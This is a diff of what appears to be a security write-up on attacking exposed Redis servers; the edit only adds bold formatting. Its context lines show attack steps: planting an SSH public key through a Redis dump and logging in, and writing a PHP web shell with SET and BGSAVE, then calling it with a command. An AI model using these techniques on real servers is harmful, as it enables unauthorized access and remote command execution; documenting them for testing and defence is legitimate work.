@@ -53,7 +53,7 @@ redis-bits@ctime¡used-mem
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2LJ+jzG2kLfgloez6wWG721ecDBuhes7qRPDc5sJEqioNmEVzd9Mer8kxHgchMHI/IoaEWh7bsFwn2/5Jssobztlk04cGjhQAJwN2iuztPOb/6vVgaGxSiELKA31KH+GZlNZnIvzFAyl+ObQvLowDNnT0qto1TUMtJc59wGBEJfyxjOXbdN7mYLM831zkLeSEoNBtitTU/MuRdfHz5xxa4vzgjn1IGpNJFbnUZliDoiZVcucjfQRLWe/ysg/lM40JAEpEmRr+YE2GbiOAGJ1FIujX8l0Pnsptfmy1VQix+I8s22ifUM/c9DoKV2XkfGJ+ywsgM1QTmFNXKNgWU/0+qwx+oZHRxZ6Fh2Y/M02BLSk1+4IkKwDnQOPY0338bjuaUbS7+Scl2I2hdFZ95qbLXIVqbJES8lQ2PDKA2ADYILuQHLAohLRS/R2yc22DGZANwrlbxl236nRiJcSVYdZEeUEnUfNCEFbolyH0zoVx4LMcUsGoyx9gWLJ1gXWHGuM= root@yourhost
 ```
 
-Than run ssh -v -i ./id_rsa redis@IP_redis_db for connecting to the server
+Than run **ssh -v -i ./id_rsa redis@IP_redis_db** for connecting to the server
 
 Case 3:
 
@@ -67,7 +67,7 @@ SET PAYLOAD '<?=`$_GET[1]`?>'
 BGSAVE
 ```
 
-Than use a web interface to access sh.php file: http://web/sh.php?1=id
+Than use a web interface to access sh.php file **http://web/sh.php?1=id**
 
 
 <div id="disqus_thread"></div>
